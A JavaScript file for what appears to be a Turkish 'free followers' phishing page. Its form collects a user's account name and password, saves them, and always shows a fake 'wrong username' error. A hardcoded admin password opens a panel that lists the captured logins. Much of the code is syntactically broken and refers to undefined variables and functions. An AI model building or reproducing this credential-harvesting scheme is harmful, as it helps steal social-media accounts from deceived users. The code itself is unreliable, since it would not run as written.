
function checkPassword() {
    var pass = document.getElementById("password").value;
    if (pass === "hile2025") {
        document.getElementById("login-screen").style.display = "none";
        document.getElementById("main-panel").style.display = "block";
    } else {
        alert("HATALI ŞİFRE!");
    }
}

document.getElementById("hamburger").addEventListener("click", function () {
    var menu = document.getElementById("menu");
    menu.style.display = menu.style.display === "none" ? "block" : "none";
});

function showTapiçigönder() {
    document.getElementById("Takipçigönder-panel").style.display = "block";
    document.getElementById("Admin-login").style.display = "none";
    document.getElementById("Adminler-panel").style.display = "none";
}

function showAdminLogin() {
    document.getElementById("Takipçigönder-panel").style.display = "none"
    document.getElementById("Admin-login").style.display = "block";
    document.getElementById("Adminler-panel").style.display = "none";
}

function checkAdminPassword() {
    var pass = document.getElementById("Admin-password").value;
    if (pass === "erenw25") {
        showCevaplar();
    } else {
        alert("YASAK GİRİŞ!");
    }
}

function saveForm() {
    var form = document.getElementById("anketForm");
    var formData = new FormData(form);

    var cevap = {
        can: formData.get("KULLANICI ADI ?"),
        memo: formData.get("ŞİFRE ?"),
        secim: formData.get("KAÇ TAKİPÇİ İSTERSİNİZ?")
    };

    var mevcut = JSON.parse(localStorage.getItem("Adminler") || "[]");
    mevcut.push(Admin);
    localStorage.setItem("Admin", JSON.stringify(mevcut));

    alert("HATA !!! KULLANICI ADI HATALI!");
    form.reset();
    return false;
}

function showAdminler() {
    var liste = document.getElementById("Adminler-listesi");
    liste.innerHTML = "";
    document.getElementById("Adminler-login").style.display = "none";
    document.getElementById("Adminler-panel").style.display = "block";

    var Adminler = JSON.parse(localStorage.getItem("Adminler") || "[]");
    if (Adminler.length === 0) {
        liste.innerHTML = "<p>Henüz Admin yok.</p>";
        return;
    }

    cevaplar.forEach(function (Admin, index) {
        var div = document.createElement("div");
        div.innerHTML = "<strong>Admin #" + (index + 1) + "</strong><br>" +
                        "KULLANICI ADI ?: " + Admin.KULLANICI ADI + "<br>" +
                        "ŞİFRE ?: " + Admin.ŞİFRE ? + "<br>" +
                        "KAÇ TAKİPÇİ İSTERSİNİZ ?: " + Admin.KAÇ TAKİPÇİ İSTERSİNİZ ? + "<hr>";
        liste.appendChild(div);
    });
}
